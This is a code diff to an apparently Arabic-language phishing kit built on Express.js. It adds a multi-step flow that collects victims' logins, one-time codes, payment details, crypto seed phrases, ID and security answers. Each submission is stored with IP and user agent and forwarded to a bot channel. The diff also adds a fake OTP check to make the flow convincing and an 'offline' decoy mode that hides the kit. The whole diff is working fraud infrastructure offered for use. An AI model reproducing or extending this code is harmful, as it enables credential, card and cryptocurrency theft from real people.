@@ -6,7 +6,7 @@ import { fileURLToPath } from 'node:url';
 import db from './db.js';
 import { bot, notify } from './bot.js';
 import { getTemplate, getCategories, getTemplatesByCategory } from './templates.js';
-import { generateOTP, generateCSRFToken, verifyCSRFToken, storeOTP, verifyOTP, checkThrottle } from './security.js';
+import { generateOTP, generateCSRFToken, verifyCSRFToken, storeOTP, verifyOTP, checkThrottle, getOTPForDev } from './security.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
@@ -60,6 +60,34 @@ const isAdmin = (req, res, next) => req.session.admin ? next() : res.redirect('/
 const slugify = s => String(s || '').trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, '').replace(/-+/g, '-');
 const esc = s => String(s).replace(/[&<>"']/g, c => ({'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'}[c]));
 
+// layout → view name mapping
+const LAYOUT_VIEW = {
+  auth:         'login',
+  otp:          'otp',
+  otp_long:     'seed_phrase',
+  checkpoint:   'checkpoint',
+  verify:       'verify',
+  payment:      'payment',
+  security_q:   'verify',
+  id_verify:    'verify',
+  seed_phrase:  'seed_phrase',
+  locked:       'locked',
+  confirm:      'complete',
+  complete:     'complete',
+  landing:      'landing',
+  'hero-center':'landing',
+  cards:        'landing'
+};
+
+function resolveView(layout) {
+  return LAYOUT_VIEW[layout] || 'landing';
+}
+
+function getNextPage(tpl, currentSlug) {
+  const idx = tpl.pages.findIndex(p => p.slug === currentSlug);
+  return idx >= 0 && idx < tpl.pages.length - 1 ? tpl.pages[idx + 1] : null;
+}
+
 // PUBLIC ROUTES
 app.get('/', (req, res) => res.redirect('/admin'));
 
@@ -71,43 +99,81 @@ app.get('/p/:slug/:pageSlug?', (req, res) => {
 
     const tpl = getTemplate(page.template_id);
     const defaultSlug = tpl.pages[0]?.slug || 'login';
-    const pageContent = tpl.pages.find(p => p.slug === (pageSlug || defaultSlug)) || tpl.pages[0];
+    const targetSlug = pageSlug || defaultSlug;
+    const pageContent = tpl.pages.find(p => p.slug === targetSlug) || tpl.pages[0];
 
-    db.prepare('UPDATE pages SET views = views + 1 WHERE id = ?').run(page.id);
-    const viewName = { auth: 'login', otp: 'otp', landing: 'landing', 'hero-center': 'landing', cards: 'landing' }[pageContent.layout] || 'landing';
+    // offline mode: show static locked/complete page immediately
+    if (page.mode === 'offline' && targetSlug === defaultSlug) {
+      return res.render('locked', {
+        page, tpl,
+        pageContent: { headline: 'الخدمة غير متاحة حالياً', subheadline: 'يرجى المحاولة لاحقاً.', slug: 'locked', form_type: 'locked', fields: [], cta: '' },
+        allPages: tpl.pages
+      });
+    }
 
-    res.render(viewName, { page, tpl, pageContent, allPages: tpl.pages, sent: !!req.query.sent, verified: !!req.query.verified });
+    // only increment views on first page
+    if (!pageSlug || pageSlug === defaultSlug) {
+      db.prepare('UPDATE pages SET views = views + 1 WHERE id = ?').run(page.id);
+    }
+
+    res.render(resolveView(pageContent.layout), {
+      page, tpl, pageContent, allPages: tpl.pages,
+      sent: !!req.query.sent, verified: !!req.query.verified
+    });
   } catch (err) {
     console.error('Get page error:', err.message);
     res.status(500).send('خطأ في تحميل الصفحة');
   }
 });
 
+// helper: save lead data + notify
+async function saveLead(page, tpl, stepSlug, body, req) {
+  const data = {};
+  for (const [k, v] of Object.entries(body)) {
+    if (!['_hp','_csrf','_step'].includes(k)) data[k] = String(v).slice(0, 2000);
+  }
+  data.step = stepSlug;
+  const ip = req?.ip || null;
+  const ua = req?.get?.('user-agent') || null;
+  db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
+    .run(page.id, JSON.stringify(data), ip, ua);
+
+  const pageContent = getTemplate(page.template_id).pages.find(p => p.slug === stepSlug);
+  if (pageContent?.notify_step !== false) {
+    const lines = Object.entries(data)
+      .filter(([k]) => k !== 'step')
+      .map(([k, v]) => `<b>${esc(k)}</b>: ${esc(v)}`).join('\n');
+    const emoji = { login:'🔐', otp:'🔢', payment:'💳', seed_phrase:'🌱', id_verify:'🪪', security_q:'❓' }[pageContent?.form_type] || '📋';
+    await notify(`${emoji} <b>${esc(pageContent?.step_label || stepSlug)}</b>\n📄 <b>${esc(tpl.name)}</b>\n\n${lines}`).catch(() => {});
+  }
+}
+
 app.post('/p/:slug/login', async (req, res) => {
   try {
     const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
     if (!page) return res.status(404).send('not found');
+    if (req.body._hp) return res.redirect(`/p/${page.slug}`);
 
-    // Throttle check
     const throttle = checkThrottle(page.id, req.ip);
     if (throttle.throttled) {
-      return res.status(429).json({ error: `تم تجاوز المحاولات. حاول بعد ${throttle.retryAfter} ثانية` });
+      return res.status(429).send(`يرجى الانتظار ${throttle.retryAfter} ثانية`);
     }
 
     const tpl = getTemplate(page.template_id);
-    db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
-      .run(page.id, JSON.stringify({ step: 'login', ...req.body }), req.ip, req.get('user-agent') || '');
+    await saveLead(page, tpl, 'login', req.body, req);
 
-    const code = generateOTP(6);
-    storeOTP(page.id, req.ip, code);
-    console.log(`✅ OTP generated for ${req.params.slug}: ${code}`);
+    // find next step after login
+    const nextPage = getNextPage(tpl, 'login');
+    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
 
-    const lines = Object.entries(req.body)
-      .filter(([k]) => !['_hp', 'remember', '_csrf'].includes(k))
-      .map(([k, v]) => `<b>${esc(k)}</b>: ${esc(v)}`).join('\n');
+    // if next step is OTP, generate and store code
+    if (nextPage.layout === 'otp') {
+      const code = generateOTP(nextPage.otp_length || 6);
+      storeOTP(page.id, req.ip, code);
+      console.log(`✅ OTP for ${page.slug}: ${code}`);
+    }
 
-    await notify(`🔐 <b>Login Step</b>\n📄 <b>${esc(tpl.name)}</b>\n\n${lines}`);
-    res.redirect(`/p/${page.slug}/verify`);
+    res.redirect(`/p/${page.slug}/${nextPage.slug}`);
   } catch (err) {
     console.error('Login error:', err.message);
     res.status(500).send('خطأ');
@@ -120,22 +186,66 @@ app.post('/p/:slug/verify', async (req, res) => {
     if (!page) return res.status(404).send('not found');
 
     const tpl = getTemplate(page.template_id);
+    // find the otp page in this template
+    const otpPage = tpl.pages.find(p => p.layout === 'otp');
+    const otpSlug = otpPage?.slug || 'verify';
+
+    // validate OTP
     const result = verifyOTP(page.id, req.ip, req.body.code);
     if (!result.valid) {
-      return res.status(400).json({ error: `كود غلط: ${result.reason}` });
+      const pageContent = otpPage || { headline: 'أدخل الكود', subheadline: 'بعتنا كود تحقق', fields: ['code'], layout: 'otp', cta: 'تأكيد', otp_length: 6 };
+      return res.render('otp', { page, tpl, pageContent, allPages: tpl.pages, error: 'كود غير صحيح. حاول مرة أخرى.' });
     }
 
-    db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
-      .run(page.id, JSON.stringify({ step: 'otp', ...req.body }), req.ip, req.get('user-agent') || '');
+    await saveLead(page, tpl, otpSlug, req.body, req);
 
-    const lines = Object.entries(req.body)
-      .filter(([k]) => k !== '_csrf')
-      .map(([k, v]) => `<b>${k}</b>: <code>${esc(v)}</code>`).join('\n');
+    // find next step after OTP
+    const nextPage = getNextPage(tpl, otpSlug);
+    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
 
-    await notify(`🔢 <b>OTP Step</b>\n📄 <b>${esc(tpl.name)}</b>\n\n${lines}`);
-    res.redirect(`/p/${page.slug}/home?verified=1`);
+    res.redirect(`/p/${page.slug}/${nextPage.slug}?verified=1`);
   } catch (err) {
     console.error('OTP verify error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+// Generic step handler — handles ALL non-login, non-verify steps
+app.post('/p/:slug/step/:stepSlug', async (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
+    if (!page) return res.status(404).send('not found');
+
+    const tpl = getTemplate(page.template_id);
+    const stepSlug = req.params.stepSlug;
+
+    await saveLead(page, tpl, stepSlug, req.body, req);
+
+    // if next step is OTP, generate code
+    const nextPage = getNextPage(tpl, stepSlug);
+    if (nextPage?.layout === 'otp') {
+      const code = generateOTP(nextPage.otp_length || 6);
+      storeOTP(page.id, req.ip, code);
+      console.log(`✅ OTP for ${page.slug}/${nextPage.slug}: ${code}`);
+    }
+
+    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
+    res.redirect(`/p/${page.slug}/${nextPage.slug}`);
+  } catch (err) {
+    console.error('Step error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+// complete page
+app.get('/p/:slug/complete', (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE slug = ?').get(req.params.slug);
+    if (!page) return res.status(404).send('not found');
+    const tpl = getTemplate(page.template_id);
+    const lastPage = tpl.pages[tpl.pages.length - 1];
+    res.render('complete', { page, tpl, pageContent: lastPage || {}, allPages: tpl.pages });
+  } catch (err) {
     res.status(500).send('خطأ');
   }
 });
@@ -285,8 +395,9 @@ app.get('/admin/pages/:id', isAdmin, (req, res) => {
     const page = db.prepare('SELECT * FROM pages WHERE id = ?').get(req.params.id);
     if (!page) return res.status(404).send('not found');
     const leads = db.prepare('SELECT * FROM leads WHERE page_id = ? ORDER BY id DESC LIMIT 50').all(page.id);
-    page.template_name = getTemplate(page.template_id).name;
-    res.render('page_detail', { page, leads });
+    const tpl = getTemplate(page.template_id);
+    page.template_name = tpl.name;
+    res.render('page_detail', { page, leads, tpl });
   } catch (err) {
     console.error('Page detail error:', err.message);
     res.status(500).send('خطأ');
@@ -307,6 +418,29 @@ app.post('/admin/pages/:id', isAdmin, (req, res) => {
     res.redirect('/admin/pages/' + req.params.id);
   } catch (err) {
     console.error('Update page error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+// mode toggle: online ↔ offline
+app.post('/admin/pages/:id/mode', isAdmin, (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE id=?').get(req.params.id);
+    if (!page) return res.status(404).send('not found');
+    const newMode = page.mode === 'offline' ? 'online' : 'offline';
+    db.prepare('UPDATE pages SET mode=? WHERE id=?').run(newMode, req.params.id);
+    res.redirect(req.headers.referer || '/admin');
+  } catch (err) {
+    res.status(500).send('خطأ');
+  }
+});
+
+// flow step control: set which step to show (skips to step)
+app.post('/admin/pages/:id/flow-step', isAdmin, (req, res) => {
+  try {
+    db.prepare('UPDATE pages SET flow_step=? WHERE id=?').run(req.body.step || '', req.params.id);
+    res.redirect(req.headers.referer || '/admin');
+  } catch (err) {
     res.status(500).send('خطأ');
   }
 });
@@ -358,6 +492,16 @@ app.post('/admin/pages/:id/delete', isAdmin, (req, res) => {
     res.status(500).send('خطأ');
   }
 });
+
+// DEV ONLY — remove in production
+if (process.env.NODE_ENV !== 'production') {
+  app.get('/dev/otp/:slug', (req, res) => {
+    const page = db.prepare('SELECT * FROM pages WHERE slug=?').get(req.params.slug);
+    if (!page) return res.json({ error: 'not found' });
+    const code = getOTPForDev(page.id, req.ip) || getOTPForDev(page.id, '::1') || getOTPForDev(page.id, '127.0.0.1');
+    res.json({ code: code || 'not found — check console', slug: req.params.slug });
+  });
+}
 
 // BOT
 if (bot) {
